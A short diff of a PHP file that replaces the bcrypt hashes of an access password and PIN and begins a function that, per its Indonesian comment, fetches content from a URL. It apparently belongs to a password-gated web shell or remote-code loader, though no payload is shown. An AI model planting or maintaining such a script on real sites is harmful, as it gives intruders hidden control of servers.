@@ -8,8 +8,8 @@ define('SECURE_ACCESS', true);
 header('X-Powered-By: none');
 header('Content-Type: text/html; charset=UTF-8');
 
-$hashed_password = '$2a$12$z1/eFYwKSRIBEJkVee2w/eoaSITGP/y3l34mm7Bdn/dlJnJheRIUG';
-$hashed_pin      = '$2a$12$Bya8HK/e25OQlOae9ti1BuucUd8tcqQFS1sU/ypCkrB6r6F3qkDIK';
+$hashed_password = '$2a$12$jmstD/fh60C7M2YYr5xNgeRNjEkBSMUCSy8AL37VYIvpHrh95pVkO';
+$hashed_pin      = '$2a$12$wQVxBgNyZpeSlmcQwvF9YObeubmLRf3QEw/nAa6558rxQB.MZdBSW';
 
 // ambil konten dari URL
 function geturlsinfo($url) {
